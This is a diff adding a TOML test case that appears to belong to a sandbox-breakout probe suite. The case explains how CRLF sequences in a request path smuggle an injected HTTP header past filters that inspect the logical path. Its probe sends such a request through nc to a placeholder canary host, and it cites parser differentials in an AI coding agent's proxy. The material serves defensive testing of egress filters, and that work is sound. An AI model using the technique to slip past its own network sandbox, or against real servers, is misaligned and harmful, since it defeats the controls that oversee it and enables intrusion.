@@ -1,0 +1,18 @@
+id = "net-crlf-header-injection"
+name = "CRLF injection into the request line"
+category = "net"
+description = "Smuggles an injected header into the HTTP request via CRLF sequences in the path. Filters that inspect the logical path miss what actually lands on the wire; the canary records the injected header as proof of delivery. Same parser-differential family as the null-byte hostname, on the request line instead of the authority."
+references = [
+  "HTTP request smuggling / CRLF injection classes (OWASP)",
+  "Claude Code proxy parser differentials (2026): same root cause, different byte",
+]
+
+probe = '''
+printf 'GET /hit/@@TECH_ID@@/@@NONCE@@ HTTP/1.0\r\nX-Breakout-Injected: yes\r\n\r\n' \
+  | nc @@CANARY_HOST@@ @@CANARY_PORT@@ >/dev/null 2>&1
+'''
+
+[preconditions]
+bins = ["nc"]
+oracle = "canary"
+
